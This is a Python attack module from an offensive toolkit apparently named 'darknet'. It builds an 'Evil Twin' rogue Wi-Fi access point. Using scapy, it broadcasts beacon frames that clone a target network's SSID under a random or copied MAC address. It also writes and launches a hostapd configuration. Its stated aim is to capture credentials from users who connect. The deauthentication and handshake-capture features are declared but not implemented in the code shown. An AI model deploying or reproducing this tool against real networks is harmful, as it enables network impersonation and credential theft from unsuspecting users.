"""
Evil Twin attack module
Creates fake access point to capture credentials
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.core.packet import PacketHandler
from darknet.utils.constants import *
import subprocess
import time
import threading


class EvilTwinAttack(AttackModule):
    """
    Evil Twin attack with automated credential capture
    Creates rogue AP mimicking target network
    """

    def __init__(self):
        super().__init__(
            name="Evil Twin Attack",
            description="Create rogue AP to capture credentials",
            attack_type=ATTACK_EVIL_TWIN
        )
        self.target_ssid = None
        self.target_mac = None
        self.target_channel = None
        self.target_encryption = None
        self.rogue_mac = None
        self.dhcp_enabled = True
        self.auto_deauth = True
        self.beacon_interval = 0.1
        self.captured_handshakes = []
        self.connected_clients = set()
        self.beacon_thread = None

    def setup(self, **kwargs) -> bool:
        """
        Setup evil twin attack
        Args:
            interface: Wireless interface
            target_ssid: Target network SSID
            target_mac: Target AP MAC (optional, will be randomized)
            target_channel: Channel to operate on
            target_encryption: Encryption type
            dhcp_enabled: Enable DHCP server
            auto_deauth: Automatically deauth clients from real AP
        """
        try:
            self.interface = kwargs.get('interface')
            self.target_ssid = kwargs.get('target_ssid')
            self.target_mac = kwargs.get('target_mac')
            self.target_channel = kwargs.get('target_channel', 6)
            self.target_encryption = kwargs.get('target_encryption', ENCRYPTION_WPA2)
            self.dhcp_enabled = kwargs.get('dhcp_enabled', True)
            self.auto_deauth = kwargs.get('auto_deauth', True)

            if not self.interface or not self.target_ssid:
                self.logger.error("Interface and SSID required")
                return False

            # Generate random MAC if not provided
            if not self.target_mac:
                import random
                self.rogue_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                )
            else:
                self.rogue_mac = self.target_mac

            self.logger.info(f"Evil Twin configured:")
            self.logger.info(f"  SSID: {self.target_ssid}")
            self.logger.info(f"  MAC: {self.rogue_mac}")
            self.logger.info(f"  Channel: {self.target_channel}")
            self.logger.info(f"  Encryption: {self.target_encryption}")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _send_beacons(self):
        """Send beacon frames continuously"""
        self.logger.info("Starting beacon broadcast")

        while not self._stop_event.is_set():
            try:
                # Create beacon frame
                dot11 = Dot11(
                    type=0,
                    subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=self.rogue_mac,
                    addr3=self.rogue_mac
                )

                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=self.target_ssid, len=len(self.target_ssid))
                dsset = Dot11Elt(ID='DSset', info=chr(self.target_channel))

                # Build packet
                pkt = RadioTap() / dot11 / beacon / essid / dsset

                # Add encryption info
                if self.target_encryption != ENCRYPTION_OPEN:
                    rsn = Dot11Elt(ID='RSNinfo', info=(
                        '\x01\x00'
                        '\x00\x0f\xac\x04'
                        '\x01\x00'
                        '\x00\x0f\xac\x04'
                        '\x01\x00'
                        '\x00\x0f\xac\x02'
                        '\x00\x00'
                    ))
                    pkt = pkt / rsn

                # Send beacon
                sendp(pkt, iface=self.interface, verbose=False)
                self.packets_sent += 1

                time.sleep(self.beacon_interval)

            except Exception as e:
                self.logger.error(f"Beacon error: {e}")
                break

    def _setup_hostapd(self):
        """Setup hostapd for more stable AP"""
        config = f"""
interface={self.interface}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.target_channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=DarknetCapture123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
"""
        try:
            with open('/tmp/darknet_hostapd.conf', 'w') as f:
                f.write(config)

            # Start hostapd
            subprocess.Popen(
                ['hostapd', '/tmp/darknet_hostapd.conf'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            self.logger.success("Hostapd started")
            return True

        except Exception as e:
            self.logger.error(f"Hostapd setup failed: {e}")
            return False

    def run(self) -> dict:
        """Execute evil twin attack"""
        try:
            self.logger.attack(f"Starting Evil Twin attack for '{self.target_ssid}'")

            # Set channel
            subprocess.run(
                ['iw', 'dev', self.interface, 'set', 'channel', str(self.target_channel)],
                check=True,
                capture_output=True
            )

            # Start beacon broadcasting
            self.beacon_thread = threading.Thread(target=self._send_beacons)
            self.beacon_thread.daemon = True
            self.beacon_thread.start()

            # Monitor for connections
            while not self._stop_event.is_set():
                time.sleep(1)

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'clients_connected': len(self.connected_clients),
                'handshakes_captured': len(self.captured_handshakes)
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        subprocess.run(['pkill', 'hostapd'], capture_output=True)
        self.logger.info("Evil Twin stopped")

    def cleanup(self):
        """Cleanup resources"""
        try:
            subprocess.run(['pkill', 'hostapd'], capture_output=True)
            if os.path.exists('/tmp/darknet_hostapd.conf'):
                os.remove('/tmp/darknet_hostapd.conf')
        except Exception:
            pass
